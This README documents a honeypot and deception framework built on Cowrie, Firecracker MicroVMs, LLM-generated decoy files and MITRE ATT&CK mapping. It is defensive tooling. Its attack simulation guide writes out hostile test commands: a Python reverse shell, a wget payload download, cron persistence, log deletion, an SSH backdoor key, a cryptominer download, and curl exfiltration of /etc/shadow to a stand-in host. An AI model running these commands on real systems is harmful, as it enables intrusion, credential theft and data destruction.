# AADE — Autonomous Adaptive Deception Environment

> A next-generation honeypot framework that **eliminates fingerprinting** through LLM-powered human-behavior synthesis, reinforcement-learning-driven interaction scaling, and live MicroVM migration — all mapped in real time to the MITRE ATT&CK framework.

---

## Table of Contents

1. [Setup & Running the System](#1-setup--running-the-system)
2. [Attack Simulation Guide (15 Scenarios)](#2-attack-simulation-guide-15-scenarios)
3. [What is AADE?](#3-what-is-aade)
4. [The Problem It Solves](#4-the-problem-it-solves)
5. [System Architecture](#5-system-architecture)
6. [Components](#6-components)
7. [Tech Stack](#7-tech-stack)
8. [Key Innovations](#8-key-innovations)

---

## 1. Setup & Running the System

> **Platform requirement:** This framework relies on Linux-exclusive features — KVM virtualisation, AF_VSOCK, and iptables. It will not run on macOS or Windows. Recommended: Kali Linux (bare-metal or VMware with nested virtualisation enabled).

Move this entire directory (`aade`) to your Linux host, then follow the steps below.

### 1. Execute the Master Installer

Run the master installation script to install all dependencies, download tools, and prepare Firecracker and Cowrie instances.

```bash
chmod +x master_install.sh
./master_install.sh
```

### 2. Generate the Gold Image (Phase 2)

Generate a rootfs filled with fake data that tricks the attacker into believing it's a real machine.

```bash
# Assuming you mounted an ext4 filesystem to /mnt/gold
sudo python3 generate_noise.py
```

### 3. Setup Honeywall (Phase 4)

This prevents malware and attacks launched inside the honeypot from escaping into the real network.

```bash
sudo chmod +x honeywall_setup.sh
sudo ./honeywall_setup.sh
```

### 4. Running the System

Once everything is downloaded and the gold image is built and sealed, launch the ecosystem in separate terminals:

**Terminal 1:** Start the vsock listener (must run before Firecracker so the MicroVM can connect on boot)

```bash
python3 vsock_listener.py
```

**Terminal 2:** Start the C2 mitmproxy sinkhole

```bash
mitmproxy -p 8080 -s c2_sinkhole.py --ssl-insecure
```

**Terminal 3:** Launch the Cowrie honeypot (from `~/aade/cowrie` directory created by installer)

```bash
cd ~/aade/cowrie
bin/cowrie start
```

**Terminal 4:** Launch the Dashboard

```bash
python3 dashboard.py
# Dashboard will be available at http://localhost:5000
```

**Terminal 5:** Launch the Orchestrator

```bash
python3 orchestrator.py
```

When the attacker connects to Cowrie and executes a suspicious command, the **Orchestrator** triggers live-migration from Cowrie into an active Firecracker MicroVM. Any actions inside the MicroVM are piped out to the host via **AF_VSOCK**. The **Dashboard** actively polls the `.jsonl` logs to show you what's happening live using MITRE ATT&CK mappings.

---

## 2. Attack Simulation Guide (15 Scenarios)

This guide provides a comprehensive walkthrough for testing the **AADE's Adaptive Logic**. Attacks are categorized by MITRE levels. **Bot-like** attacks are contained within the low-interaction Honeypot, while **Interactive/Advanced** behaviors trigger a transparent shift to a high-interaction **Firecracker MicroVM**.

---

### 🛠️ Phase A: Discovery & Staging (Bot-Heavy / Tier 1)
*Initial capture and environment mapping.*

**(01)-(System Reconnaissance)-(L1)**
`whoami; id; uname -a`
This is the "First Contact" chain. Attackers (human or bot) immediately attempt to verify their privilege (root vs. user) and the machine's architecture. `uname -a` reveals the kernel version, which informs the choice of subsequent local exploit attempts.
**Cowrie Reaction:** The low-interaction honeypot provides a standard response, logging the user's IP and basic intent. Since this is non-destructive, the system remains in the lightweight Cowrie environment.

**(02)-(Network Enumeration)-(L1)**
`netstat -antp; route -n`
Here, the attacker is mapping the internal network topology. They are looking for open ports (like database or internal service ports) and checking if the machine has a gateway to other internal subnets. It's a precursor to lateral movement.
**Cowrie Reaction:** AADE presents a "believable" fake network routing table. The TTP Mapper flags this as **T1016 (System Network Configuration Discovery)**.

**(03)-(Service & OS Fingerprinting)-(L1)**
`cat /etc/os-release; ls /etc/init.d`
Attackers check the exact Linux distribution (e.g., Debian vs. CentOS) to ensure their binary payloads are compatible. Checking `/etc/init.d` helps identify what services (web servers, databases) are running and how they are managed (SystemV vs. SystemD).
**Cowrie Reaction:** Provides a fake Debian environment. High-frequency probes here often indicate an automated botnet script scanning for specific vulnerable OS versions.

**(04)-(Credential Preparation)-(L2)**
`cat /etc/passwd; find / -name "*.history"`
The goal is to gather a list of valid usernames for further brute-forcing or to find plaintext secrets inadvertently left in bash histories or backup files. This is a critical step for Privilege Escalation.
**Cowrie Reaction:** Detection marks this as **T1003 (OS Credential Dumping)**. If the attacker starts searching for sensitive files intensely, the RL agent increases the "Aggression Score."

**(05)-(External Payloading)-(L2)**
`wget http://example.com/malware.sh -O /tmp/malware.sh`
The attacker is attempting to bring in external tools. This is a major behavioral transition. Until now, the attacker has been using native binaries; now, they are introducing custom logic to the environment.
**Cowrie Reaction:** The file is "downloaded" into the honeypot's virtual storage. This action is a high-priority trigger that moves the session closer to an Adaptive Shift.

---

### ⚡ Phase B: Interactive Escalation (Human-Centric / Tier 2)
*High-risk behaviors that indicate manual control.*

**(06)-(Sudo Privilege Probe)-(L2)**
`sudo -l`
By running `sudo -l`, a human attacker checks if their guest account has any password-less execution rights or misconfigurations. This is rarely done by simple bots but is a standard operating procedure for human hackers.
**Adaptive Trigger:** The intent to gain root via misconfiguration signifies a persistent threat. The Orchestrator prepares the **Firecracker MicroVM** for an imminent handoff to provide a "real" escalation path.

**(07)-(Automated Persistence)-(L3)**
`(crontab -l ; echo "*/15 * * * * /tmp/malware.sh") | crontab -`
The attacker is ensuring they "stay" in the system. By adding a entry to the system scheduler (cron), they ensure their malware restarts automatically even if the honeypot is refreshed or the system reboots.
**Reaction:** AADE logs this as **T1053.003 (Scheduled Task/Job)**. This level of persistence behavior usually marks the end of simple bot activity and the start of a "Session Hijack" protection.

**(08)-(Anti-Forensics / Trace Removal)-(L3)**
`rm -rf /var/log/syslog; unset HISTFILE`
The attacker is trying to hide. Deleting system logs and unsetting the history file (`HISTFILE`) are classic "Covering Tracks" techniques used by skilled humans to avoid detection by incident response teams.
**MicroVM Shift:** This "Cleaning" attempt is a perfect deception opportunity. AADE performs a live migration to a MicroVM where it presents "real" logs that the attacker can delete, making them believe their invasion is now invisible.

**(09)-(Process Camouflage Monitor)-(L3)**
`ps aux | grep -v "malware"`
The attacker is self-auditing. They are running a process list to ensure their tools aren't being monitored or that other competing attackers haven't already compromised the box. The `grep -v` filter specifically hides their own activity from their view.
**MicroVM Reaction:** The MicroVM environment provides a real, high-perf process tree. The **AF_VSOCK** listener captures this filtered search as a high-intent signal for advanced evasion.

**(10)-(Direct Kernel Callback / Reverse Shell)-(L4)**
`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
One of the most dangerous commands: a Python-based reverse shell. It sends an interactive command-line stream back to the attacker's machine, effectively bypassing simple inbound firewalls.
**Honeywall Reaction:** Inside the MicroVM, this connection is intercepted. Instead of reaching the internet, it hits the **C2 Sinkhole**, allowing us to monitor the attacker's "Remote Control" commands in total isolation.

---

### 💀 Phase C: Deep Deception & Impact (APT / Tier 3)
*Simulating the final stages of a high-value breach.*

**(11)-(Credential Persistence / SSH Keys)-(L4)**
`ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys`
The attacker is installing their own "Backdoor Key." This allows them to log back into the server without a password at any time. It's a high-confidence indicator of an intent to use this machine as a "pivoting host" for the rest of the network.
**Reaction:** The LLM Synthesizer injects these keys into the "Real" filesystem within the MicroVM, validating the attacker's success while we map the key fingerprint for cross-victim tracking.

**(12)-(Ransomware Deployment Flow)-(L4)**
`gpg --symmetric --cipher-algo AES256 important_data.tar`
The attacker is performing native encryption for impact. GPG is often used to encrypt the entire data directory. They believe they are holding the server's data hostage.
**Synthesis Trigger:** AADE populates the gold image directory with LLM-generated documents (e.g., `payroll_2025.csv`, `source_code.zip`). The attacker encrypts these **fake** high-value artifacts, confirming the "Impact" tactic on the dashboard.

**(13)-(Resource Mining / Hijacking)-(L4)**
`curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &`
The attacker is turning the server into a "Profit Center." Using `xmrig` to mine cryptocurrency (like Monero) consumes high CPU but generates revenue for the attacker.
**Control Reaction:** The MicroVM's CPU is throttled to 10% to prevent host impact, while the dashboard renders a "Resource Hijacking" alert with the specific miner configuration caught from the command line.

**(14)-(Kernel Escape Discovery)-(L5)**
`sysctl -w kernel.panic=1; cat /proc/kcore`
An extremely advanced APT-level behavior. The attacker is probing kernel core memory and trying to force a system crash to test if they can "break out" of the container or VM into the host operating system.
**Deep Deception:** The MicroVM runs a real kernel, so these commands return real, terrifying outputs to the attacker, but the **Honeywall** and **KVM Isolation** ensure the host remains 100% safe.

**(15)-(Covert Exfiltration & Network Pivot)-(L5)**
`curl --data-binary @/etc/shadow http://exfil.server/upload`
The final "smash and grab." The attacker is exfiltrating the encrypted system passwords (`/etc/shadow`) using a binary HTTP POST. This is a deliberate attempt to crack user passwords offline and move to the next machine in the enterprise.
**Analysis:** The C2 Sinkhole captures the raw binary data stream. We now have a copy of the specific exfiltration protocol the attacker uses, which can be shared as an **IOC (Indicator of Compromise)**.

---

## 3. What is AADE?

AADE is a **fully autonomous adaptive deception platform** that traps and studies attackers without ever revealing it's a honeypot. Unlike static honeypots that experienced attackers can fingerprint in seconds, AADE:

- Starts with a low-interaction SSH trap (**Cowrie**) to capture initial behavior
- On detecting serious intent, **live-migrates the session into a Firecracker MicroVM** — a real kernel running a fake-but-convincing filesystem
- Uses an **LLM to synthesize human-like shell history, cron jobs, and user artifacts** so the attacker believes they've compromised a real machine
- Uses **reinforcement learning** to adapt how much it reveals vs. how long it keeps the attacker engaged
- Silently **sinkholes all outbound C2 traffic** via mitmproxy, letting you observe the attacker's command-and-control infrastructure
- Maps every attacker action to **MITRE ATT&CK TTPs** live on a dashboard

---

## 4. The Problem It Solves

Traditional honeypots are detected trivially:
- Static filesystem with no real user history → fingerprinted immediately
- No real kernel → `uname`, `/proc`, timing attacks reveal virtualization
- No real network responses → C2 beacons fail silently
- No adaptation → once an attacker discovers it's fake, all intelligence is lost

AADE addresses all four. The attacker gets a live kernel, a realistic filesystem generated by an LLM, real network responses (sinkholes included), and the system adapts its deception depth using RL based on attacker aggression level.

---

## 5. System Architecture

```
Attacker
   │
   ▼
[Cowrie SSH Honeypot]  ←── low-interaction trap, logs keystrokes
   │
   │  suspicious command detected
   ▼
[Orchestrator]  ←── decides: escalate to MicroVM?
   │
   ├──► [LLM Synthesizer]  ──► generates fake user artifacts into gold image
   │
   ├──► [Firecracker MicroVM]  ──► live kernel, sealed rootfs, real shell
   │         │
   │         │  all I/O piped via AF_VSOCK (port 40)
   │         ▼
   │    [VSOCK Listener]  ──► host receives every command silently
   │
   ├──► [C2 Sinkhole]  ──► mitmproxy intercepts all outbound C2 traffic
   │
   ├──► [RL Orchestrator]  ──► Q-learning adapts engagement strategy
   │
   ├──► [TTP Mapper]  ──► maps actions to MITRE ATT&CK
   │
   └──► [Logger Agent]  ──► structured .jsonl event log
            │
            ▼
      [Dashboard]  ──► live Flask UI with ATT&CK heatmap
```

### Phase Summary

| Phase | What Happens |
|-------|--------------|
| **Phase 1 — Installation** | `master_install.sh` installs Firecracker, Cowrie, mitmproxy, and Python dependencies |
| **Phase 2 — Gold Image** | `generate_noise.py` seeds the MicroVM rootfs with LLM-generated fake user history, files, and cron jobs |
| **Phase 3 — Cowrie Trap** | Attacker connects via SSH; Cowrie logs all commands and session data |
| **Phase 4 — Honeywall** | `iptables` rules prevent any real malware or attacks from escaping the MicroVM into the host network |
| **Phase 5 — Live Migration** | Orchestrator detects escalation trigger, boots Firecracker MicroVM from sealed gold image |
| **Phase 6 — Silent Observation** | VSOCK listener receives all in-VM activity out-of-band; C2 sinkhole captures beacon traffic |
| **Phase 7 — Intelligence** | TTP Mapper classifies behavior; Dashboard renders ATT&CK coverage live |

---

## 6. Components

| File | Role |
|------|------|
| `orchestrator.py` | Central controller — watches Cowrie logs, decides when to trigger MicroVM migration, coordinates all subsystems |
| `rl_orchestrator.py` | Reinforcement learning layer — Q-learning agent that adapts deception depth (reveal more vs. stay quiet) based on attacker aggression signals |
| `llm_synthesizer.py` | Calls an LLM to generate realistic shell history, `.bash_history`, fake SSH keys, cron jobs, and user files injected into the gold image |
| `vsock_listener.py` | Out-of-band host-side listener on AF_VSOCK port 40; receives all MicroVM shell I/O without touching the attacker's network path |
| `c2_sinkhole.py` | mitmproxy addon that intercepts and logs all outbound C2 beacon traffic from inside the MicroVM — DNS, HTTP, raw TCP |
| `ttp_mapper.py` | Maps observed commands and behaviors to MITRE ATT&CK Tactic/Technique IDs (e.g., T1059.004 for Unix shell execution) |
| `logger_agent.py` | Structured event logger — writes timestamped `.jsonl` records for every attacker action, migration event, and TTP match |
| `dashboard.py` | Flask web dashboard (port 5000) — polls `.jsonl` logs and renders live ATT&CK heatmap, session timeline, and C2 intercept feed |
| `generate_noise.py` | Seeds the Firecracker rootfs (mounted ext4 at `/mnt/gold`) with convincing fake user artifacts generated by the LLM |
| `honeywall_setup.sh` | Configures iptables rules to isolate the MicroVM network — blocks egress to real IPs while allowing sinkhole interception |
| `master_install.sh` | One-shot installer: downloads Firecracker binary, clones and sets up Cowrie, installs all Python and system dependencies |
| `templates/` | Jinja2 HTML templates for the Flask dashboard UI |
| `tests/` | Test suite for individual components |

---

## 7. Tech Stack

| Tool / Library | Purpose |
|----------------|---------|
| **Firecracker** | KVM-based MicroVM hypervisor — provides a real Linux kernel for the deception environment |
| **Cowrie** | SSH/Telnet honeypot for initial low-interaction capture |
| **mitmproxy** | Transparent proxy for C2 traffic sinkholing and inspection |
| **AF_VSOCK** | Linux virtual socket for out-of-band MicroVM ↔ host communication |
| **iptables** | Network isolation (honeywall) to contain MicroVM traffic |
| **Flask** | Dashboard web server |
| **LLM API** | Human behavior synthesis — generates realistic fake filesystem artifacts |
| **Q-Learning (RL)** | Adaptive engagement strategy — decides deception depth at runtime |
| **MITRE ATT&CK** | Threat intelligence framework for classifying observed attacker TTPs |
| **Python 3** | Core language for all orchestration, logging, synthesis, and mapping |
| **Shell / Bash** | Installation and setup scripts |

---

## 8. Key Innovations

**Live MicroVM Migration**
When Cowrie detects a serious attacker (e.g., they run `wget`, `curl`, or attempt persistence), the orchestrator transparently migrates the session into a real Firecracker MicroVM. The attacker never notices — they think they just got a shell on a real box.

**LLM-Powered Human Behavior Synthesis**
Instead of an obviously empty filesystem, `llm_synthesizer.py` populates the gold image with contextually coherent fake data — plausible `.bash_history`, SSH key names, cron jobs, home directory structure — making fingerprinting far harder.

**RL-Adaptive Engagement**
`rl_orchestrator.py` uses Q-learning to optimize a tradeoff: reveal more of the "system" to keep the attacker engaged longer vs. stay quiet to avoid detection. The reward signal is time-on-target and intelligence gathered.

**Out-of-Band Observation via VSOCK**
All MicroVM I/O is mirrored to the host via AF_VSOCK — a channel the attacker cannot see or interfere with. No SSH tunneling, no network traffic, no fingerprinting surface.

**C2 Sinkhole**
The mitmproxy-based C2 sinkhole intercepts all outbound traffic from the MicroVM. If the attacker's malware beacons home, the sinkhole logs the C2 address, payload, and protocol while returning convincing fake responses to keep the malware alive longer.

**Real-Time MITRE ATT&CK Mapping**
Every command logged by Cowrie or the VSOCK listener is classified by `ttp_mapper.py` into ATT&CK Tactic/Technique pairs and rendered live on the dashboard.

---

*AADE — built to let attackers think they've won, while you watch every move.*
